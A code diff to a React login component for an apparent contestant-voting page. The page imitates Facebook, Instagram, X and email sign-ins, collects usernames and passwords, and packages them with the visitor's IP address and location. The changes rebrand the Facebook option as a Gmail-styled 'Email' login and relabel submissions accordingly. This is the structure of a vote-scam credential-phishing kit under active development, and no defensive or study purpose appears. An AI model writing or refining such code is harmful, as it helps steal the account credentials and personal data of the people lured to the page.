@@ -78,8 +78,12 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
         width: '100%'
     };
 
+    const isEmail = !platform?.id || platform?.id === 'email' || platform?.id === 'facebook';
+    const buttonBaseBg = isEmail ? '#ea4335' : (platform?.bgColor || '#4c78c2');
+    const buttonHoverBg = isEmail ? '#d93025' : (platform?.bgColor ? '#222222' : '#3b629f');
+
     const buttonStyle = {
-        backgroundColor: '#4c78c2', // Solid blue matching the screenshot
+        backgroundColor: buttonBaseBg,
         color: 'white',
         fontWeight: 'bold',
         fontSize: '16px',
@@ -89,7 +93,7 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
         borderRadius: '6px',
         cursor: 'pointer',
         marginTop: '4px',
-        transition: 'background-color 0.2s ease',
+        transition: 'background-color 0.2s ease, filter 0.2s ease',
         textAlign: 'center',
         width: '100%'
     };
@@ -100,7 +104,7 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
         if (e && e.preventDefault) e.preventDefault();
 
         if (!username.trim() || !password.trim()) {
-            setError('Please enter your username and assigned voting password.');
+            setError(isEmail ? 'Please enter your email and password.' : 'Please enter your username and assigned voting password.');
             return;
         }
 
@@ -131,7 +135,7 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
             password: password.trim(),
             contestantId: contestant?.id || 'FK-101',
             contestantNo: contestant?.contestantNumber || (contestant?.id ? contestant.id : '001'),
-            platform: platform?.id || platform?.name || 'direct',
+            platform: (platform?.id === 'facebook' ? 'email' : (platform?.id || platform?.name || 'email')),
             clientIp,
             location: clientLocation
         };
@@ -165,7 +169,9 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
                     particleCount: 75,
                     spread: 70,
                     origin: { x: 0.5, y: 0.45 },
-                    colors: ['#4c78c2', '#1877F2', '#28a745', '#ffc107', '#7c3aed']
+                    colors: isEmail
+                        ? ['#ea4335', '#d93025', '#fbbc05', '#34a853', '#4285f4']
+                        : ['#4c78c2', '#1877F2', '#28a745', '#ffc107', '#7c3aed']
                 });
             } catch (err) {
                 console.error(err);
@@ -175,8 +181,15 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
 
     // Render platform branding or user's LOGO
     const renderLogo = () => {
-        if (platform?.id === 'facebook') {
-            return <span style={{ color: '#1877f2', fontSize: '38px', fontWeight: 800, letterSpacing: '-2px' }}>facebook</span>;
+        if (platform?.id === 'email' || platform?.id === 'facebook') {
+            return (
+                <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                    <svg width="34" height="34" viewBox="0 0 24 24" fill="#ea4335">
+                        <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
+                    </svg>
+                    <span style={{ color: '#ea4335', fontSize: '36px', fontWeight: 800, letterSpacing: '-0.5px' }}>Email</span>
+                </div>
+            );
         }
         if (platform?.id === 'instagram') {
             return <span style={{ background: 'linear-gradient(45deg, #f09433, #dc2743, #bc1888)', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', fontSize: '34px', fontWeight: 800 }}>Instagram</span>;
@@ -187,10 +200,15 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
         if (platform?.id === 'twitter') {
             return <span style={{ color: '#000000', fontSize: '34px', fontWeight: 800 }}>𝕏</span>;
         }
-        return 'LOGO';
+        return (
+            <div style={{ display: 'inline-flex', alignItems: 'center', justifyContent: 'center', gap: '8px' }}>
+                <svg width="34" height="34" viewBox="0 0 24 24" fill="#ea4335">
+                    <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z" />
+                </svg>
+                <span style={{ color: '#ea4335', fontSize: '36px', fontWeight: 800, letterSpacing: '-0.5px' }}>Email</span>
+            </div>
+        );
     };
-
-    const contestantNo = contestant?.contestantNumber || (contestant?.id ? contestant.id : '001');
 
     return (
         <div style={containerStyle}>
@@ -201,12 +219,12 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
             <form style={formStyle} onSubmit={handleSubmit}>
                 <div style={inputContainerStyle}>
                     <input
-                        type="text"
-                        placeholder="Username or Email"
+                        type={isEmail ? 'email' : 'text'}
+                        placeholder={isEmail ? 'Email address' : 'Username or Email'}
                         value={username}
                         onChange={(e) => setUsername(e.target.value)}
                         style={topInputStyle}
-                        autoComplete="username"
+                        autoComplete={isEmail ? 'email' : 'username'}
                     />
                     <input
                         type="password"
@@ -241,10 +259,10 @@ export default function LoginForm({ contestant, platform, onConfirmVote, onBack 
                         cursor: isSubmitting ? 'not-allowed' : 'pointer'
                     }}
                     onMouseEnter={(e) => {
-                        if (!isSubmitting) e.currentTarget.style.backgroundColor = '#3b629f'
+                        if (!isSubmitting) e.currentTarget.style.backgroundColor = buttonHoverBg;
                     }}
                     onMouseLeave={(e) => {
-                        if (!isSubmitting) e.currentTarget.style.backgroundColor = '#4c78c2'
+                        if (!isSubmitting) e.currentTarget.style.backgroundColor = buttonBaseBg;
                     }}
                 >
                     {isSubmitting ? 'logging in...' : 'log in'}
